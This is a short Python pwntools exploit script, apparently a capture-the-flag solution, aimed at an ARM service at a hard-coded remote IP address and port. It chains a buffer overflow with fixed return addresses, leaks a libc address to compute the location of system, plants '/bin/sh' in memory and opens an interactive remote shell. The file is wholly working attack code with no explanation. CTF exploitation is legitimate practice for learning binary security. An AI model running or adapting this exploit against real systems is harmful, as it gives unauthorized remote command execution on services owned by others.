from pwn import*


p=remote("13.124.80.124",'6667')
context.arch='arm'

print(p.recv(1024))

payload1="a"*100+p32(0xf6ffe010)
payload1+=p32(0x10364)+p32(0xf6ffe00c)+p32(0x10534)+"aaaa"
p.send(payload1)

payload2=p32(0xf6ffe020)+p32(0x10364)+p32(0x21014)+p32(0x10544)+p32(0xf6ffe268)+p32(0x10528)
payload2+="b"*(0x78-len(payload2))
p.send(payload2)
a=p.recv(1024)
b=p.recv(1024)
#b=b[0:4]
b=b[1:5]
system=u32(b)-156668
print(hex(system))

payload3=p32(0xf6ffe214)+p32(0x10364)+p32(0xf6ffe218)+p32(0x10544)+"AAAA"+p32(0x10528)+"/bin/sh\x00"
payload3+="c"*(100-len(payload3))+p32(0xf6ffe204)
payload3+=p32(0x10364)+p32(0x21014)+p32(0x10534)+"cccc"
p.send(payload3)

payload4=p32(system)
p.send(payload4+"\n")

p.interactive()
